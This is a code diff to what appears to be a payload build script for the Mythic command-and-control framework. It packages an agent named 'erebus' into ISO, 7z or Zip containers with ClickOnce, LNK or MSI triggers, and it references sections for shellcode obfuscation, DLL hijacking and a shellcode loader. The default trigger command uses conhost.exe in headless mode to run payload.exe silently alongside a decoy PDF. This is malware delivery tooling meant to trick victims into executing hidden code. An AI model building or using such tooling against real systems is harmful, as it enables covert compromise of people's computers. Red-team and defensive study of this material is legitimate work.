@@ -161,18 +161,30 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             name = "Trigger Type",
             parameter_type = BuildParameterType.ChooseOne,
             description = "Choose a command to run when the trigger is executed.",
-            choices = ["ClickOnce", "LNK", "MSI", "7z"],
+            choices = ["ClickOnce", "LNK", "MSI"],
             default_value = "ClickOnce",
-            hide_conditions = [
-                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
-            ]
+        ),
+
+        BuildParameter(
+            name = "Trigger Binary",
+            parameter_type = BuildParameterType.String,
+            description = "Choose a command to run when the trigger is executed.",
+            default_value = "C:\\Windows\\System32\\conhost.exe",
+        ),
+
+        BuildParameter(
+            name = "Container Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Choose a command to run when the trigger is executed.",
+            choices = ["ISO", "7z", "Zip"],
+            default_value = "Zip",
         ),
 
         BuildParameter(
             name = "Trigger Command",
             parameter_type = BuildParameterType.String,
             description = "Choose a command to run when the trigger is executed.",
-            default_value = "C:\\Windows\\System32\\conhost.exe --headless cmd.exe /Q /c payload.exe | decoy.pdf",
+            default_value = "--headless cmd.exe /Q /c payload.exe | decoy.pdf",
         ),
 
         BuildParameter(
@@ -264,7 +276,7 @@ generated if none have been entered.""",
                 HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
             ]
         ),
-        
+
         #7z
     BuildParameter(
         name="7z Compression Level",
@@ -273,10 +285,10 @@ generated if none have been entered.""",
         choices=["0", "1", "3", "5", "7", "9"],
         default_value="9",
         hide_conditions=[
-            HideCondition(name="Trigger Type", operand=HideConditionOperand.NotEQ, value="7z")
+            HideCondition(name="Container Type", operand=HideConditionOperand.NotEQ, value="7z")
         ]
     ),
-    
+
     BuildParameter(
         name="Archive Password",
         parameter_type=BuildParameterType.String,
@@ -284,25 +296,10 @@ generated if none have been entered.""",
         default_value="",
         required=False,
         hide_conditions=[
-            HideCondition(name="Trigger Type", operand=HideConditionOperand.NotEQ, value="7z")
+            HideCondition(name="Container Type", operand=HideConditionOperand.NotEQ, value="7z")
         ]
-    ),        
-
-        # ProtectMyTooling
-        # BuildParameter(
-
-        # ),
-
-        # LNK
-        # BuildParameter(
-
-        # ),
-
-        # PackMyPayload
-        # BuildParameter(
-
-        # ),
-    ]
+    ),
+]
 
     build_steps = [
         BuildStep(step_name = "Gathering Files",
@@ -345,22 +342,22 @@ generated if none have been entered.""",
         """
         trigger = self.get_parameter("Trigger Type")
         if trigger == "7z":
-            
+
             files = {
                 "erebus.exe": str(self.generated_payload_path)
             }
-            
+
             spec = {
                 "files": files,
                 "archive_name": "payload.7z",
                 "payload_name": "erebus.exe"
             }
-            
+
             spec_path = PurePath(self.agent_build_path) / f"spec_{self.uuid}.json"
-            
+
             with open(spec_path, "w") as f:
                 json.dump(spec, f)
-                
+
             try:
                 return build_7z(
                     spec_name=str(spec_path),
@@ -371,7 +368,7 @@ generated if none have been entered.""",
             finally:
                 if os.path.exists(spec_path):
                     os.remove(spec_path)
-                    
+
         return None
 
     def create_triggers(self):
@@ -449,6 +446,7 @@ generated if none have been entered.""",
                 StepSuccess = True
             ))
 
+            ######################### Shellcode Obfuscation Section #########################
             with open(str(mythic_shellcode_path), "rb") as f:
                 header = f.read(2)
                 if header == b"\x4d\x5a":
@@ -583,7 +581,7 @@ generated if none have been entered.""",
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
             output = ""
-
+            ######################### End of Shellcode Obfuscation Section #########################
 
             ######################### DLL Hijacking Section #########################
             if self.get_parameter("Main Payload Type") == "Hijack":
@@ -711,6 +709,7 @@ generated if none have been entered.""",
                     return response
                 output = ""
             ######################### End Of DLL Hijacking Section #########################
+
             ######################### Shellcode Loader Section #########################
             if self.get_parameter("Main Payload Type") == "Loader":
                 print(f'User Selected: {self.get_parameter("Main Payload Type")}')
@@ -804,8 +803,8 @@ generated if none have been entered.""",
                 output = ""
             ######################### End Of Shellcode Loader Section #########################
 
-            #Final Payload / Container
-            
+            ######################### Final Payload / Container #########################
+
             # 1. Capture context for container function
             if 'payload_path' in locals():
                 final_path = payload_path
@@ -822,31 +821,31 @@ generated if none have been entered.""",
                 # Case A: Container created (7z/MSI)
                 with open(container_path, "rb") as f:
                     response.payload = f.read()
-                
-                trigger = self.get_parameter("Trigger Type")
-                ext = "7z" if trigger == "7z" else "bin"
-                if trigger == "MSI": ext = "msi"
-                
+
+                container = self.get_parameter("Container Type")
+                ext = "7z" if container == "7z" else "bin"
+                if container == "MSI": ext = "msi"
+
                 response.updated_filename = f"payload.{ext}"
                 response.status = BuildStatus.Success
-                response.build_message = f"Success! Containerized ({trigger})"
-                
+                response.build_message = f"Success! Containerized ({container})"
+
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
                     StepName="Containerising",
-                    StepStdout=f"Payload packaged into {trigger} container",
+                    StepStdout=f"Payload packaged into {container} container",
                     StepSuccess=True,
                 ))
-            else:
+            elif self.get_parameter("Container Type") == "Zip":
                 # Case B: Default ZIP behavior (No specific container selected)
                 shutil.make_archive(f"{agent_build_path}/payload", "zip", f"{agent_build_path}/payload")
                 response.payload = open(f"{agent_build_path}/payload.zip", "rb").read()
-                
+
                 response.updated_filename = "payload.zip"
                 response.status = BuildStatus.Success
                 response.build_message = "Success! Packaged (Zip)"
-                
+
                 await SendMythicRPCPayloadUpdatebuildStep(
                     MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
@@ -856,7 +855,7 @@ generated if none have been entered.""",
                 ))
 
             return response
-        
+
         except Exception as e:
             response.status = BuildStatus.Error
             response.build_message = f"Error building wrapper: {str(e)}\n{output}"
